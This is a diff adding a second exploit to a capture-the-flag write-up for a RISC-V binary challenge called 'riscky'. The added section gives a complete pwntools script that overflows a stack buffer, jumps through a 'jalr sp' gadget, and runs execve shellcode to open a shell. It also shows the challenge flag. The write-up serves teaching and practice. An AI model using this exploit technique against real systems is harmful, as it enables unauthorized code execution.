@@ -224,3 +224,66 @@ Output:
 $ cat flag.txt
 flag{834e1b43c9cdfab13d9352fc949cec7b}
 ```
+
+
+## Exploit 2
+
+After the CTF ended and while writing this write up I wanted to find a solution that did not require hardcoding the buffer address.  I do not have any tools to find ROP gadgets for RISC-V, so I started reading through the disassembly:
+
+```bash
+/usr/bin/riscv64-linux-gnu-objdump -d riscky | less
+```
+
+JFC, it didn't take long to stumble upon:
+
+```assembly
+000000000001060c <helpful>:
+   1060c:       9102                    jalr    sp
+```
+
+Basically the challenge author gave us a gift.
+
+A better solution:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+binary = ELF('./riscky', checksec=False)
+context.arch = 'riscv'
+context.bits = 64
+
+if args.REMOTE:
+    p = remote('challenge.nahamcon.com', 30533)
+else:
+    if args.D:
+        p = process('qemu-riscv64 -g 9000 -L /usr/riscv64-linux-gnu riscky'.split())
+    else:
+        p = process('qemu-riscv64 riscky'.split())
+
+# https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html
+shellcode = asm(f'''
+li s1, {'0x' + bytes.hex(b'/bin/sh'[::-1])}
+sd s1, -16(sp)              # Store dword s1 on the stack
+addi a0,sp,-16              # a0 = filename = sp + (-16)
+slt a1,zero,-1              # a1 = argv set to 0
+slt a2,zero,-1              # a2 = envp set to 0
+li a7, 221                  # execve = 221
+ecall                       # Do syscall
+''')
+
+if args.D: print(disasm(shellcode))
+
+payload  = b''
+payload += (520 - 8) * b'A'
+payload += p64(binary.sym.helpful)
+payload += shellcode
+
+p.sendlineafter(b'> ', payload)
+p.interactive()
+```
+
+Above is like most 90's _No ASLR-gets-executable stack-jump to stack_ type solutions, where there's a `jmp rsp` or `jmp esp` (or in this case `jalr sp`) gadget that can be used to call your shellcode down stack.
+
+This was probably the intended solution.
